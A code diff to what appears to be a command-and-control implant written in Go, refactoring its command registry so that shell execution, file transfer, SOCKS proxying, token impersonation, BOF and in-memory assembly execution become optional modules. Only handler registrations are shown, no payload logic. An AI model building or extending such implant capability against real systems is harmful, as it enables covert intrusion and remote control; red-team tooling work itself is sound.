@@ -75,16 +75,10 @@ func NewCommandQueue() *WorkQueue {
 		activeUploads:   make(map[string]*SI, 4),      // Pre-allocate for concurrent uploads
 	}
 
-	// Register all core commands using numeric IDs
-	// Cross-platform commands (1-18)
+	// Register core commands (always available)
 	queue.registerHandler(CmdCd, wrapCommand(&ChDirMsg{}))
 	queue.registerHandler(CmdLs, wrapCommand(&ListDirMsg{}))
 	queue.registerHandler(CmdPwd, wrapCommand(&GetDirMsg{}))
-	queue.registerHandler(CmdDownload, wrapCommand(&FM{}))
-	queue.registerHandler(CmdUpload, wrapCommand(&SendMsg{}))
-	queue.registerHandler(CmdShell, wrapCommand(&ExecMsg{}))
-	queue.registerHandler(CmdSocks, wrapCommand(&ProxyMsg{}))
-	queue.registerHandler(CmdSocksHTTP, wrapCommand(GetSocksHTTPHandler()))
 	queue.registerHandler(CmdJobkill, wrapCommand(&WorkStopMsg{}))
 	queue.registerHandler(CmdExit, wrapCommand(&QuitMsg{}))
 	queue.registerHandler(CmdSleep, wrapCommand(&IntervalMsg{}))
@@ -97,24 +91,10 @@ func NewCommandQueue() *WorkQueue {
 	queue.registerHandler(CmdRm, wrapCommand(&RemoveMsg{}))
 	queue.registerHandler(CmdWhoami, wrapCommand(&WhoamiCommand{}))
 
-	// Windows specific commands (200-232)
-	queue.registerHandler(CmdToken, wrapCommand(&CredMsg{}))
-	queue.registerHandler(CmdRev2self, wrapCommand(&AuthResetMsg{}))
-	queue.registerHandler(CmdBof, wrapCommand(&TaskRunMsg{}))
-	queue.registerHandler(CmdBofAsync, wrapCommand(&AsyncTaskMsg{}))
-	queue.registerHandler(CmdBofJobs, wrapCommand(&JobListMsg{}))
-	queue.registerHandler(CmdBofOutput, wrapCommand(&TaskOutputMsg{}))
-	queue.registerHandler(CmdBofKill, wrapCommand(&JobStopMsg{}))
-	queue.registerHandler(CmdInlineAssembly, wrapCommand(&NativeRunMsg{}))
-	queue.registerHandler(CmdInlineAssemblyAsync, wrapCommand(&NativeAsyncMsg{}))
-	queue.registerHandler(CmdInlineAssemblyJobs, wrapCommand(&NativeJobsMsg{}))
-	queue.registerHandler(CmdInlineAssemblyOutput, wrapCommand(&NativeOutputMsg{}))
-	queue.registerHandler(CmdInlineAssemblyKill, wrapCommand(&NativeStopMsg{}))
-	queue.registerHandler(CmdInlineAssemblyJobsClean, wrapCommand(&NativeCleanMsg{}))
-	queue.registerHandler(CmdInlineAssemblyJobsStats, wrapCommand(&NativeStatsMsg{}))
-	queue.registerHandler(CmdLink, wrapCommand(&RM{}))
-	queue.registerHandler(CmdUnlink, wrapCommand(&DM{}))
-	queue.registerHandler(CmdLinks, wrapCommand(&RLM{}))
+	// Register optional feature handlers (populated by init() in register_*.go files)
+	for _, reg := range featureHandlers {
+		queue.registerHandler(reg.id, reg.handler)
+	}
 
 	// Print all registered commands
 
